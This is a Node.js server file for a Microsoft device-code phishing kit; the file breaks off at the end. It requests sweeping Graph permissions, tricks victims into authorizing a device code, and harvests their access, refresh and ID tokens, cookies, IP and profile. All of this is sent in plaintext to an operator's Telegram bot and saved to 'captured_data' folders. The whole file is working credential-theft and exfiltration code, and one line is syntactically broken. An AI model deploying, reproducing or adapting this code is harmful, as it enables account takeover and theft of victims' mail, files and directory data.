require('dotenv').config();
const express = require('express');
const axios = require('axios');
const crypto = require('crypto');
const path = require('path');
const cookieParser = require('cookie-parser');
const fs = require('fs').promises;
const { URL } = require('url');

const app = express();

// Ultra-optimized middleware
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public'), { maxAge: '1d' }));

// ============================================================================
// ADVANCED CONFIGURATION
// ============================================================================

const config = {
  microsoft: {
    tenantId: process.env.MICROSOFT_TENANT_ID || 'common',
    clientId: process.env.MICROSOFT_CLIENT_ID,
    // MAXIMUM SCOPES - Ensures all Microsoft services are accessible
    scope: [
      // Core Identity & Auth
      'openid', 'profile', 'email', 'offline_access',
      // User & Directory
      'User.Read', 'User.ReadBasic.All', 'User.ReadWrite', 'User.ReadWrite.All',
      'Directory.Read.All', 'Directory.ReadWrite.All', 'Directory.AccessAsUser.All',
      // Mail & Exchange
      'Mail.Read', 'Mail.ReadWrite', 'Mail.Send', 'Mail.ReadBasic',
      'MailboxSettings.Read', 'MailboxSettings.ReadWrite',
      // Calendars
      'Calendars.Read', 'Calendars.ReadWrite', 'Calendars.ReadWrite.Shared',
      // Contacts
      'Contacts.Read', 'Contacts.ReadWrite',
      // Files & OneDrive
      'Files.Read', 'Files.ReadWrite', 'Files.ReadWrite.All',
      // SharePoint & Sites
      'Sites.Read.All', 'Sites.ReadWrite.All', 'Sites.Manage.All', 'Sites.FullControl.All',
      // Teams
      'Team.ReadBasic.All', 'TeamSettings.Read.All', 'TeamSettings.ReadWrite.All',
      // Tasks
      'Tasks.Read', 'Tasks.ReadWrite',
      // Notes
      'Notes.Read', 'Notes.Create', 'Notes.ReadWrite', 'Notes.ReadWrite.All',
      // People & Presence
      'People.Read', 'People.Read.All', 'Presence.Read', 'Presence.Read.All',
      // Groups
      'Group.Read.All', 'Group.ReadWrite.All',
      // Device Management
      'Device.Read.All', 'Device.Command',
      // Application
      'Application.Read.All', 'Application.ReadWrite.All',
    ].join(' '),
  },
  telegram: {
    botToken: process.env.TELEGRAM_BOT_TOKEN,
    chatId: process.env.TELEGRAM_CHAT_ID,
    // Split large messages into chunks
    maxMessageLength: 4000,
  },
  server: {
    port: process.env.PORT || 3000,
    appUrl: process.env.RAILWAY_PUBLIC_DOMAIN 
      ? `https://${process.env.RAILWAY_PUBLIC_DOMAIN}`
      : process.env.APP_URL || 'http://localhost:3000',
  },
  security: {
    encryptionKey: Buffer.from(
      process.env.ENCRYPTION_KEY || crypto.randomBytes(32).toString('hex'),
      'hex'
    ),
  },
  storage: {
    dataDir: path.join(__dirname, 'captured_data'),
    reportsDir: path.join(__dirname, 'captured_data', 'reports'),
    tokensDir: path.join(__dirname, 'captured_data', 'tokens'),
    cookiesDir: path.join(__dirname, 'captured_data', 'cookies'),
    jsonDir: path.join(__dirname, 'captured_data', 'json'),
    txtDir: path.join(__dirname, 'captured_data', 'txt'),
  }
};

if (!config.microsoft.clientId) {
  console.error('❌ FATAL: MICROSOFT_CLIENT_ID required');
  process.exit(1);
}

// Create all directories
(async () => {
  try {
    await Promise.all(Object.values(config.storage).map(dir => 
      fs.mkdir(dir, { recursive: true })
    ));
    console.log('[STORAGE] All directories created');
  } catch (err) {
    console.error('[STORAGE] Error:', err.message);
  }
})();

// ============================================================================
// ADVANCED ENCRYPTION
// ============================================================================

class AdvancedEncryption {
  static encrypt(data) {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv('aes-256-gcm', config.security.encryptionKey, iv);
    const encrypted = Buffer.concat([cipher.update(data, 'utf8'), cipher.final()]);
    const authTag = cipher.getAuthTag();
    const hmac = crypto.createHmac('sha256', config.security.encryptionKey);
    hmac.update(encrypted);
    
    return {
      encrypted: encrypted.toString('hex'),
      iv: iv.toString('hex'),
      authTag: authTag.toString('hex'),
      signature: hmac.digest('hex'),
      algorithm: 'AES-256-GCM',
      timestamp: new Date().toISOString(),
    };
  }
}

// ============================================================================
// STORAGE MANAGER
// ============================================================================

class StorageManager {
  static async saveJSON(filename, data) {
    const filepath = path.join(config.storage.jsonDir, `${filename}.json`);
    await fs.writeFile(filepath, JSON.stringify(data, null, 2), 'utf8');
    console.log(`[JSON] Saved: ${filename}.json`);
    return filepath;
  }

  static async saveTXT(filename, content) {
    const filepath = path.join(config.storage.txtDir, `${filename}.txt`);
    await fs.writeFile(filepath, content, 'utf8');
    console.log(`[TXT] Saved: ${filename}.txt`);
    return filepath;
  }

  static async saveReport(captureId, reportContent) {
    const filepath = path.join(config.storage.reportsDir, `FULL_REPORT_${captureId}.txt`);
    await fs.writeFile(filepath, reportContent, 'utf8');
    console.log(`[REPORT] Saved: FULL_REPORT_${captureId}.txt`);
    return filepath;
  }

  static async saveAll(captureId, data) {
    const timestamp = new Date().toISOString().replace(/:/g, '-');
    
    // Save JSON files
    await Promise.all([
      this.saveJSON(`tokens_${timestamp}_${captureId}`, data.tokens),
      this.saveJSON(`cookies_${timestamp}_${captureId}`, data.cookies),
      this.saveJSON(`session_${timestamp}_${captureId}`, data.session),
      this.saveJSON(`user_${timestamp}_${captureId}`, data.user),
      this.saveJSON(`complete_${timestamp}_${captureId}`, data),
    ]);

    // Generate and save TXT report
    const reportContent = this.generateFullReport(data);
    await this.saveReport(captureId, reportContent);

    return { success: true, captureId, timestamp };
  }

  static generateFullReport(data) {
    const lines = [];
    const separator = '='.repeat(80);
    const subseparator = '-'.repeat(80);

    lines.push(separator);
    lines.push('MICROSOFT TOKEN CAPTURE - COMPLETE REPORT');
    lines.push(separator);
    lines.push('');
    lines.push(`Capture ID: ${data.metadata.captureId}`);
    lines.push(`Timestamp: ${data.metadata.timestamp}`);
    lines.push(`Session ID: ${data.metadata.sessionId}`);
    lines.push(`User Code: ${data.metadata.userCode}`);
    lines.push(`Server URL: ${data.metadata.serverUrl}`);
    lines.push('');

    // TOKENS SECTION
    lines.push(separator);
    lines.push('1. TOKENS - COMPLETE UNTRUNCATED');
    lines.push(separator);
    lines.push('');

    // Access Token
    lines.push('1.1 ACCESS TOKEN (PLAINTEXT - FULL):');
    lines.push(subseparator);
    lines.push(data.tokens.access.plaintext);
    lines.push('');
    lines.push(`Type: ${data.tokens.access.type}`);
    lines.push(`Length: ${data.tokens.access.length} characters`);
    lines.push(`Expires In: ${data.tokens.access.expiresIn} seconds`);
    lines.push(`Expires At: ${data.tokens.access.expiresAt}`);
    lines.push('');

    // Access Token Encrypted
    lines.push('1.2 ACCESS TOKEN (ENCRYPTED - FULL):');
    lines.push(subseparator);
    lines.push(`Algorithm: ${data.tokens.access.encrypted.algorithm}`);
    lines.push(`Encrypted Data: ${data.tokens.access.encrypted.encrypted}`);
    lines.push(`IV: ${data.tokens.access.encrypted.iv}`);
    lines.push(`Auth Tag: ${data.tokens.access.encrypted.authTag}`);
    lines.push(`Signature: ${data.tokens.access.encrypted.signature}`);
    lines.push('');

    // Access Token Decoded
    lines.push('1.3 ACCESS TOKEN (DECODED JWT):');
    lines.push(subseparator);
    if (data.tokens.access.decoded) {
      lines.push('HEADER:');
      lines.push(JSON.stringify(data.tokens.access.decoded.header, null, 2));
      lines.push('');
      lines.push('PAYLOAD (ALL CLAIMS):');
      lines.push(JSON.stringify(data.tokens.access.decoded.payload, null, 2));
      lines.push('');
      lines.push(`SIGNATURE: ${data.tokens.access.decoded.signature}`);
    }
    lines.push('');

    // Refresh Token
    if (data.tokens.refresh) {
      lines.push('1.4 REFRESH TOKEN (PLAINTEXT - FULL):');
      lines.push(subseparator);
      lines.push(data.tokens.refresh.plaintext);
      lines.push('');
      lines.push(`Length: ${data.tokens.refresh.length} characters`);
      lines.push(`Potential PRT: ${data.tokens.refresh.isPotentialPRT ? 'YES' : 'NO'}`);
      lines.push('');

      lines.push('1.5 REFRESH TOKEN (ENCRYPTED - FULL):');
      lines.push(subseparator);
      lines.push(`Algorithm: ${data.tokens.refresh.encrypted.algorithm}`);
      lines.push(`Encrypted Data: ${data.tokens.refresh.encrypted.encrypted}`);
      lines.push(`IV: ${data.tokens.refresh.encrypted.iv}`);
      lines.push(`Auth Tag: ${data.tokens.refresh.encrypted.authTag}`);
      lines.push(`Signature: ${data.tokens.refresh.encrypted.signature}`);
      lines.push('');

      if (data.tokens.refresh.decoded) {
        lines.push('1.6 REFRESH TOKEN (DECODED):');
        lines.push(subseparator);
        lines.push(JSON.stringify(data.tokens.refresh.decoded, null, 2));
        lines.push('');
      }
    }

    // ID Token
    if (data.tokens.id) {
      lines.push('1.7 ID TOKEN (PLAINTEXT - FULL):');
      lines.push(subseparator);
      lines.push(data.tokens.id.plaintext);
      lines.push('');
      lines.push(`Length: ${data.tokens.id.length} characters`);
      lines.push('');

      lines.push('1.8 ID TOKEN (ENCRYPTED - FULL):');
      lines.push(subseparator);
      lines.push(`Algorithm: ${data.tokens.id.encrypted.algorithm}`);
      lines.push(`Encrypted Data: ${data.tokens.id.encrypted.encrypted}`);
      lines.push(`IV: ${data.tokens.id.encrypted.iv}`);
      lines.push(`Auth Tag: ${data.tokens.id.encrypted.authTag}`);
      lines.push('');

      if (data.tokens.id.decoded) {
        lines.push('1.9 ID TOKEN (DECODED JWT):');
        lines.push(subseparator);
        lines.push('HEADER:');
        lines.push(JSON.stringify(data.tokens.id.decoded.header, null, 2));
        lines.push('');
        lines.push('PAYLOAD:');
        lines.push(JSON.stringify(data.tokens.id.decoded.payload, null, 2));
        lines.push('');
      }
    }

    // COOKIES SECTION
    lines.push(separator);
    lines.push('2. COOKIES - ALL MICROSOFT COOKIES');
    lines.push(separator);
    lines.push('');

    lines.push('2.1 RAW COOKIE HEADER (COMPLETE):');
    lines.push(subseparator);
    lines.push(data.cookies.all.rawCookieHeader || 'None');
    lines.push('');

    lines.push('2.2 PARSED COOKIES (ALL):');
    lines.push(subseparator);
    lines.push(JSON.stringify(data.cookies.all.cookies, null, 2));
    lines.push('');

    lines.push('2.3 MICROSOFT-SPECIFIC COOKIES:');
    lines.push(subseparator);
    lines.push(JSON.stringify(data.cookies.microsoftCookies, null, 2));
    lines.push('');

    lines.push('2.4 EMAIL-RELATED COOKIES:');
    lines.push(subseparator);
    lines.push(JSON.stringify(data.cookies.emailCookies, null, 2));
    lines.push('');

    lines.push('2.5 AUTHENTICATION COOKIES:');
    lines.push(subseparator);
    lines.push(JSON.stringify(data.cookies.authCookies, null, 2));
    lines.push('');

    lines.push('2.6 SESSION COOKIES:');
    lines.push(subseparator);
    lines.push(JSON.stringify(data.cookies.sessionCookies, null, 2));
    lines.push('');

    // SESSION SECTION
    lines.push(separator);
    lines.push('3. SESSION DATA - COMPLETE');
    lines.push(separator);
    lines.push('');

    lines.push('3.1 SESSION INFORMATION:');
    lines.push(subseparator);
    lines.push(`Session ID: ${data.session.sessionId}`);
    lines.push(`User Code: ${data.session.userCode}`);
    lines.push(`Timestamp: ${data.session.timestamp}`);
    lines.push('');

    lines.push('3.2 TRACKING DATA:');
    lines.push(subseparator);
    lines.push(`IP Address: ${data.session.tracking.ip}`);
    lines.push(`User Agent: ${data.session.tracking.userAgent}`);
    lines.push(`Language: ${data.session.tracking.language}`);
    lines.push(`Referer: ${data.session.tracking.referer || 'None'}`);
    lines.push(`Origin: ${data.session.tracking.origin || 'None'}`);
    lines.push('');

    lines.push('3.3 BROWSER FINGERPRINT:');
    lines.push(subseparator);
    lines.push(JSON.stringify(data.session.fingerprint, null, 2));
    lines.push('');

    lines.push('3.4 ALL REQUEST HEADERS:');
    lines.push(subseparator);
    lines.push(JSON.stringify(data.cookies.all.headers, null, 2));
    lines.push('');

    // USER SECTION
    lines.push(separator);
    lines.push('4. USER DATA - COMPLETE');
    lines.push(separator);
    lines.push('');

    lines.push('4.1 USER PROFILE (FULL):');
    lines.push(subseparator);
    lines.push(JSON.stringify(data.user.profile, null, 2));
    lines.push('');

    lines.push('4.2 USER CLAIMS (ACCESS TOKEN):');
    lines.push(subseparator);
    lines.push(JSON.stringify(data.user.claims.fromAccessToken, null, 2));
    lines.push('');

    lines.push('4.3 USER CLAIMS (ID TOKEN):');
    lines.push(subseparator);
    lines.push(JSON.stringify(data.user.claims.fromIdToken, null, 2));
    lines.push('');

    lines.push('4.4 COMBINED CLAIMS:');
    lines.push(subseparator);
    lines.push(JSON.stringify(data.user.claims.combined, null, 2));
    lines.push('');

    // SCOPES SECTION
    lines.push(separator);
    lines.push('5. SCOPES - GRANTED PERMISSIONS');
    lines.push(separator);
    lines.push('');

    lines.push('5.1 GRANTED SCOPES:');
    lines.push(subseparator);
    data.scopes.granted.forEach((scope, idx) => {
      lines.push(`${idx + 1}. ${scope}`);
    });
    lines.push('');
    lines.push(`Total Granted: ${data.scopes.count}`);
    lines.push('');

    // TECHNICAL SECTION
    lines.push(separator);
    lines.push('6. TECHNICAL DETAILS');
    lines.push(separator);
    lines.push('');

    lines.push('6.1 ENCRYPTION:');
    lines.push(subseparator);
    lines.push(JSON.stringify(data.technical.encryption, null, 2));
    lines.push('');

    lines.push('6.2 TOKEN METADATA:');
    lines.push(subseparator);
    lines.push(JSON.stringify(data.technical.tokenMetadata, null, 2));
    lines.push('');

    lines.push('6.3 JWT ALGORITHMS:');
    lines.push(subseparator);
    lines.push(JSON.stringify(data.technical.jwt, null, 2));
    lines.push('');

    // SUMMARY
    lines.push(separator);
    lines.push('7. CAPTURE SUMMARY');
    lines.push(separator);
    lines.push('');
    lines.push(`✅ Access Token: ${data.tokens.access ? 'CAPTURED' : 'MISSING'}`);
    lines.push(`✅ Refresh Token: ${data.tokens.refresh ? 'CAPTURED' : 'MISSING'}`);
    lines.push(`✅ ID Token: ${data.tokens.id ? 'CAPTURED' : 'MISSING'}`);
    lines.push(`✅ Potential PRT: ${data.tokens.refresh?.isPotentialPRT ? 'DETECTED' : 'NO'}`);
    lines.push(`✅ Microsoft Cookies: ${Object.keys(data.cookies.microsoftCookies).length} captured`);
    lines.push(`✅ Email Cookies: ${Object.keys(data.cookies.emailCookies).length} captured`);
    lines.push(`✅ Auth Cookies: ${Object.keys(data.cookies.authCookies).length} captured`);
    lines.push(`✅ User Profile: ${data.user.profile && !data.user.profile.error ? 'CAPTURED' : 'FAILED'}`);
    lines.push(`✅ Total Scopes: ${data.scopes.count}`);
    lines.push('');

    lines.push(separator);
    lines.push('END OF REPORT');
    lines.push(separator);

    return lines.join('\n');
  }
}

// ============================================================================
// TELEGRAM SENDER - NO TRUNCATION
// ============================================================================

class TelegramSender {
  static async sendJSON(title, data) {
    if (!config.telegram.botToken || !config.telegram.chatId) {
      console.log(`[TELEGRAM DISABLED] ${title}`);
      return;
    }

    try {
      const jsonStr = JSON.stringify(data, null, 2);
      
      // Split into chunks if needed
      const chunks = this.splitIntoChunks(jsonStr, 3800);
      
      for (let i = 0; i < chunks.length; i++) {
        const text = i === 0 
          ? `${title}\n${'━'.repeat(30)}\n\`\`\`json\n${chunks[i]}\n\`\`\``
          : `${title} (Part ${i + 1})\n${'━'.repeat(30)}\n\`\`\`json\n${chunks[i]}\n\`\`\``;

        await axios.post(
          `https://api.telegram.org/bot${config.telegram.botToken}/sendMessage`,
          { 
            chat_id: config.telegram.chatId, 
            text, 
            parse_mode: 'Markdown',
          },
          { timeout: 10000 }
        );

        await this.sleep(1000); // Rate limiting
      }

      console.log(`[TELEGRAM] ✅ ${title} (${chunks.length} parts)`);
    } catch (error) {
      console.error(`[TELEGRAM] ❌ ${title}:`, error.message);
    }
  }

  static async sendFile(filepath, caption) {
    if (!config.telegram.botToken || !config.telegram.chatId) {
      console.log(`[TELEGRAM DISABLED] File: ${filepath}`);
      return;
    }

    try {
      const FormData = require('form-data');
      const form = new FormData();
      
      form.append('chat_id', config.telegram.chatId);
      form.append('document', await fs.readFile(filepath), {
        filename: path.basename(filepath),
      });
      if (caption) form.append('caption', caption);

      await axios.post(
        `https://api.telegram.org/bot${config.telegram.botToken}/sendDocument`,
        form,
        { 
          headers: form.getHeaders(),
          timeout: 30000,
          maxContentLength: Infinity,
          maxBodyLength: Infinity,
        }
      );

      console.log(`[TELEGRAM] ✅ File sent: ${path.basename(filepath)}`);
    } catch (error) {
      console.error(`[TELEGRAM] ❌ File failed:`, error.message);
    }
  }

  static splitIntoChunks(text, chunkSize) {
    const chunks = [];
    for (let i = 0; i < text.length; i += chunkSize) {
      chunks.push(text.substring(i, i + chunkSize));
    }
    return chunks;
  }

  static sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }
}

// ============================================================================
// COOKIE EXTRACTOR - COMPREHENSIVE
// ============================================================================

function extractAllMicrosoftCookies(req) {
  const allCookies = req.cookies || {};
  const rawHeader = req.headers.cookie || '';
  
  // Microsoft-specific cookie patterns
  const microsoftPatterns = [
    'msal', 'ms', 'aad', 'azure', 'graph', 'office', 'outlook',
    'login', 'auth', 'sso', 'estsauth', 'estsauthpersistent',
    'esctx', 'x-ms', 'SignInStateCookie', 'buid', 'MUID',
  ];
  
  // Email-specific cookie patterns
  const emailPatterns = [
    'outlook', 'owa', 'mail', 'exchange', 'smtp', 'imap',
  ];
  
  // Auth-specific patterns
  const authPatterns = [
    'auth', 'token', 'session', 'signin', 'login', 'sso',
    'bearer', 'oauth', 'refresh', 'access',
  ];
  
  const filterCookies = (patterns) => {
    return Object.keys(allCookies)
      .filter(key => patterns.some(pattern => 
        key.toLowerCase().includes(pattern.toLowerCase())
      ))
      .reduce((obj, key) => {
        obj[key] = allCookies[key];
        return obj;
      }, {});
  };
  
  return {
    all: {
      cookies: allCookies,
      signedCookies: req.signedCookies || {},
      rawCookieHeader: rawHeader,
      headers: {
        userAgent: req.headers['user-agent'],
        acceptLanguage: req.headers['accept-language'],
        acceptEncoding: req.headers['accept-encoding'],
        accept: req.headers['accept'],
        referer: req.headers.referer,
        origin: req.headers.origin,
        host: req.headers.host,
        connection: req.headers.connection'],
        cacheControl: req.headers['cache-control'],
        pragma: req.headers.pragma,
        upgradeInsecureRequests: req.headers['upgrade-insecure-requests'],
        dnt: req.headers.dnt,
        secFetchSite: req.headers['sec-fetch-site'],
        secFetchMode: req.headers['sec-fetch-mode'],
        secFetchUser: req.headers['sec-fetch-user'],
        secFetchDest: req.headers['sec-fetch-dest'],
      },
      ip: req.ip || req.connection.remoteAddress,
      ips: req.ips || [],
      protocol: req.protocol,
      secure: req.secure,
      timestamp: new Date().toISOString(),
    },
    microsoftCookies: filterCookies(microsoftPatterns),
    emailCookies: filterCookies(emailPatterns),
    authCookies: filterCookies(authPatterns),
    sessionCookies: allCookies,
  };
}

// ============================================================================
// JWT DECODER
// ============================================================================

function decodeJWT(token) {
  try {
    const parts = token.split('.');
    if (parts.length !== 3) return null;
    
    return {
      header: JSON.parse(Buffer.from(parts[0], 'base64').toString()),
      payload: JSON.parse(Buffer.from(parts[1], 'base64').toString()),
      signature: parts[2],
      raw: token,
    };
  } catch {
    return null;
  }
}

// ============================================================================
// STORAGE
// ============================================================================

const sessions = new Map();
const cookieStore = new Map();

// ============================================================================
// MS ENDPOINTS
// ============================================================================

const MS = {
  deviceCode: `https://login.microsoftonline.com/${config.microsoft.tenantId}/oauth2/v2.0/devicecode`,
  token: `https://login.microsoftonline.com/${config.microsoft.tenantId}/oauth2/v2.0/token`,
  userInfo: 'https://graph.microsoft.com/v1.0/me',
};

// ============================================================================
// COMPREHENSIVE CAPTURE ENGINE - NO TRUNCATION
// ============================================================================

async function captureEverythingComplete(tokenData, sessionId, userCode, cookieData) {
  console.log('\n' + '='.repeat(80));
  console.log('🚀 COMPLETE UNTRUNCATED CAPTURE');
  console.log('='.repeat(80));

  const captureId = crypto.randomUUID();
  const timestamp = new Date().toISOString();

  // Extract all tokens - NO TRUNCATION
  const accessToken = tokenData.access_token;
  const refreshToken = tokenData.refresh_token;
  const idToken = tokenData.id_token;
  
  const hasPRT = refreshToken && refreshToken.length > 500;

  console.log(`[CAPTURE] Access: ${accessToken?.length || 0} chars`);
  console.log(`[CAPTURE] Refresh: ${refreshToken?.length || 0} chars`);
  console.log(`[CAPTURE] ID: ${idToken?.length || 0} chars`);
  console.log(`[CAPTURE] PRT: ${hasPRT ? 'YES' : 'NO'}`);

  // Get user info
  let user = null;
  try {
    const res = await axios.get(MS.userInfo, {
      headers: { Authorization: `Bearer ${accessToken}` },
      timeout: 10000,
    });
    user = res.data;
    console.log(`[CAPTURE] User: ${user.displayName}`);
  } catch (err) {
    user = { error: err.message };
  }

  // Decode JWTs
  const decodedAccess = decodeJWT(accessToken);
  const decodedRefresh = refreshToken ? decodeJWT(refreshToken) : null;
  const decodedId = idToken ? decodeJWT(idToken) : null;

  // Encrypt tokens
  const encryptedTokens = {
    access: AdvancedEncryption.encrypt(accessToken),
    refresh: refreshToken ? AdvancedEncryption.encrypt(refreshToken) : null,
    id: idToken ? AdvancedEncryption.encrypt(idToken) : null,
  };

  // Build complete capture object - NO TRUNCATION
  const completeCapture = {
    metadata: {
      captureId,
      sessionId,
      userCode,
      timestamp,
      version: '4.0-COMPLETE',
      serverUrl: config.server.appUrl,
    },

    tokens: {
      access: {
        plaintext: accessToken, // FULL TOKEN
        encrypted: encryptedTokens.access,
        length: accessToken.length,
        type: tokenData.token_type || 'Bearer',
        expiresIn: tokenData.expires_in,
        expiresAt: new Date(Date.now() + (tokenData.expires_in * 1000)).toISOString(),
        decoded: decodedAccess,
      },
      
      refresh: refreshToken ? {
        plaintext: refreshToken, // FULL TOKEN
        encrypted: encryptedTokens.refresh,
        length: refreshToken.length,
        decoded: decodedRefresh,
        isPotentialPRT: hasPRT,
        prtIndicators: {
          length: refreshToken.length,
          hasMultipleParts: refreshToken.split('.').length > 1,
          encrypted: refreshToken.includes('0.A') || refreshToken.includes('M.R'),
        },
      } : null,

      id: idToken ? {
        plaintext: idToken, // FULL TOKEN
        encrypted: encryptedTokens.id,
        length: idToken.length,
        decoded: decodedId,
      } : null,
    },

    session: {
      sessionId,
      userCode,
      timestamp,
      fingerprint: cookieData.all.headers,
      tracking: {
        ip: cookieData.all.ip,
        ips: cookieData.all.ips,
        userAgent: cookieData.all.headers.userAgent,
        language: cookieData.all.headers.acceptLanguage,
        referer: cookieData.all.headers.referer,
        origin: cookieData.all.headers.origin,
      }
    },

    cookies: cookieData, // ALL COOKIES - NO TRUNCATION

    scopes: {
      granted: tokenData.scope ? tokenData.scope.split(' ') : [],
      requested: config.microsoft.scope.split(' '),
      count: tokenData.scope ? tokenData.scope.split(' ').length : 0,
    },

    user: {
      profile: user,
      claims: {
        fromAccessToken: decodedAccess?.payload || {},
        fromIdToken: decodedId?.payload || {},
        combined: {
          ...(decodedAccess?.payload || {}),
          ...(decodedId?.payload || {}),
        }
      },
    },

    technical: {
      encryption: {
        algorithm: 'AES-256-GCM',
        keyLength: 256,
        integrityCheck: 'HMAC-SHA256',
      },
      tokenMetadata: {
        tokenType: tokenData.token_type,
        expiresIn: tokenData.expires_in,
        scope: tokenData.scope,
      },
      jwt: {
        accessTokenAlgorithm: decodedAccess?.header?.alg,
        refreshTokenAlgorithm: decodedRefresh?.header?.alg,
        idTokenAlgorithm: decodedId?.header?.alg,
      },
    },
  };

  // ========================================================================
  // SAVE EVERYTHING
  // ========================================================================

  await StorageManager.saveAll(captureId, completeCapture);

  // ========================================================================
  // SEND TO TELEGRAM - NO TRUNCATION
  // ========================================================================

  // Message 1: Summary
  await TelegramSender.sendJSON('📊 *CAPTURE SUMMARY*', {
    captureId,
    timestamp,
    tokens: {
      access: '✅ CAPTURED',
      refresh: refreshToken ? '✅ CAPTURED' : '❌',
      id: idToken ? '✅ CAPTURED' : '❌',
      prt: hasPRT ? '✅ DETECTED' : '❌',
    },
    cookies: {
      total: Object.keys(cookieData.all.cookies).length,
      microsoft: Object.keys(cookieData.microsoftCookies).length,
      email: Object.keys(cookieData.emailCookies).length,
      auth: Object.keys(cookieData.authCookies).length,
    },
    files: {
      json: 5,
      txt: 1,
      report: 1,
    }
  });

  // Message 2: Access Token FULL (plaintext)
  await TelegramSender.sendJSON('🔓 *ACCESS TOKEN - PLAINTEXT (FULL)*', {
    captureId,
    token: accessToken, // COMPLETE TOKEN
    metadata: {
      type: tokenData.token_type,
      length: accessToken.length,
      expiresIn: tokenData.expires_in,
      expiresAt: completeCapture.tokens.access.expiresAt,
    }
  });

  // Message 3: Refresh Token FULL (plaintext)
  if (refreshToken) {
    await TelegramSender.sendJSON('🔄 *REFRESH TOKEN - PLAINTEXT (FULL)*', {
      captureId,
      token: refreshToken, // COMPLETE TOKEN
      metadata: {
        length: refreshToken.length,
        isPotentialPRT: hasPRT,
        prtIndicators: completeCapture.tokens.refresh.prtIndicators,
      }
    });
  }

  // Message 4: ID Token FULL (plaintext)
  if (idToken) {
    await TelegramSender.sendJSON('🆔 *ID TOKEN - PLAINTEXT (FULL)*', {
      captureId,
      token: idToken, // COMPLETE TOKEN
      length: idToken.length,
    });
  }

  // Message 5: All Tokens Encrypted
  await TelegramSender.sendJSON('🔐 *ALL TOKENS - ENCRYPTED*', {
    captureId,
    access: encryptedTokens.access,
    refresh: encryptedTokens.refresh,
    id: encryptedTokens.id,
  });

  // Message 6: Decoded JWTs
  await TelegramSender.sendJSON('🔍 *DECODED JWTs - COMPLETE*', {
    captureId,
    access: decodedAccess,
    refresh: decodedRefresh,
    id: decodedId,
  });

  // Message 7: ALL Cookies
  await TelegramSender.sendJSON('🍪 *ALL COOKIES - COMPLETE*', cookieData);

  // Message 8: User Profile
  await TelegramSender.sendJSON('👤 *USER PROFILE - COMPLETE*', {
    captureId,
    user: completeCapture.user,
    scopes: completeCapture.scopes,
  });

  // Message 9: Send TXT Report File
  const reportPath = path.join(config.storage.reportsDir, `FULL_REPORT_${captureId}.txt`);
  await TelegramSender.sendFile(reportPath, `📄 Complete Report - ${captureId}`);

  // Message 10: Send Complete JSON
  const jsonPath = path.join(config.storage.jsonDir, `complete_${timestamp.replace(/:/g, '-')}_${captureId}.json`);
  await TelegramSender.sendFile(jsonPath, `📊 Complete JSON - ${captureId}`);

  console.log(`✅ COMPLETE CAPTURE - ${captureId}`);
  console.log('='.repeat(80) + '\n');

  return { user, captureId, hasPRT };
}

// ============================================================================
// PROXY
// ============================================================================

app.get('/auth/device', async (req, res) => {
  try {
    const { code } = req.query;
    if (!code) return res.status(400).send('Code required');

    const cookieData = extractAllMicrosoftCookies(req);
    cookieStore.set(code, cookieData);

    res.cookie('device_code', code, { 
      maxAge: 900000, 
      httpOnly: true,
      secure: config.server.appUrl.startsWith('https'),
    });

    res.redirect(302, `https://microsoft.com/devicelogin?otc=${code}`);
  } catch (error) {
    console.error('[PROXY]:', error.message);
    res.status(500).send('Error');
  }
});

// ============================================================================
// API ENDPOINTS
// ============================================================================

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.post('/api/device/generate', async (req, res) => {
  try {
    const sessionId = crypto.randomUUID();
    const cookieData = extractAllMicrosoftCookies(req);

    const response = await axios.post(
      MS.deviceCode,
      new URLSearchParams({
        client_id: config.microsoft.clientId,
        scope: config.microsoft.scope,
      }),
      { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
    );

    const data = response.data;

    sessions.set(sessionId, {
      deviceCode: data.device_code,
      userCode: data.user_code,
      verificationUri: data.verification_uri,
      verificationUriComplete: data.verification_uri_complete,
      expiresIn: data.expires_in,
      interval: data.interval,
      createdAt: Date.now(),
      cookieData,
    });

    console.log(`[GENERATE] ${data.user_code}`);

    TelegramSender.sendJSON('🔐 *CODE GENERATED*', {
      sessionId,
      userCode: data.user_code,
      proxyUrl: `${config.server.appUrl}/auth/device?code=${data.user_code}`,
      expiresIn: data.expires_in,
    });

    res.json({
      sessionId,
      userCode: data.user_code,
      verificationUri: data.verification_uri,
      proxyUrl: `${config.server.appUrl}/auth/device?code=${data.user_code}`,
      expiresIn: data.expires_in,
      interval: data.interval,
    });

  } catch (error) {
    console.error('[GENERATE]:', error.message);
    res.status(500).json({ error: 'Failed' });
  }
});

app.get('/api/device/poll/:sessionId', async (req, res) => {
  try {
    const { sessionId } = req.params;
    const session = sessions.get(sessionId);

    if (!session) return res.status(404).json({ error: 'Not found' });
    if (Date.now() - session.createdAt > session.expiresIn * 1000) {
      return res.json({ status: 'expired' });
    }

    try {
      const tokenResponse = await axios.post(
        MS.token,
        new URLSearchParams({
          grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
          client_id: config.microsoft.clientId,
          device_code: session.deviceCode,
        }),
        { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
      );

      const tokenData = tokenResponse.data;

      console.log(`[SUCCESS] ${sessionId}`);

      const cookieData = cookieStore.get(session.userCode) || session.cookieData;

      // COMPLETE CAPTURE
      const result = await captureEverythingComplete(
        tokenData, 
        sessionId, 
        session.userCode, 
        cookieData
      );

      sessions.delete(sessionId);
      cookieStore.delete(session.userCode);

      res.json({
        status: 'authenticated',
        user: result.user && !result.user.error ? {
          id: result.user.id,
          displayName: result.user.displayName,
          email: result.user.mail || result.user.userPrincipalName,
        } : null,
        captureId: result.captureId,
        hasPRT: result.hasPRT,
      });

    } catch (error) {
      if (error.response?.data?.error === 'authorization_pending') {
        return res.json({ status: 'pending' });
      }
      if (error.response?.data?.error === 'authorization_declined') {
        return res.json({ status: 'declined' });
      }
      if (error.response?.data?.error === 'expired_token') {
        return res.json({ status: 'expired' });
      }
      throw error;
    }

  } catch (error) {
    console.error('[POLL]:', error.message);
    res.status(500).json({ error: 'Failed' });
  }
});

app.get('/health', (req, res) => {
  res.json({
    status: 'healthy',
    version: '4.0-COMPLETE',
    features: {
      noTruncation: true,
      txtReports: true,
      allCookies: true,
      fileUploads: true,
    }
  });
});

// ============================================================================
// START
// ============================================================================

app.listen(config.server.port, async () => {
  console.log('\n' + '='.repeat(80));
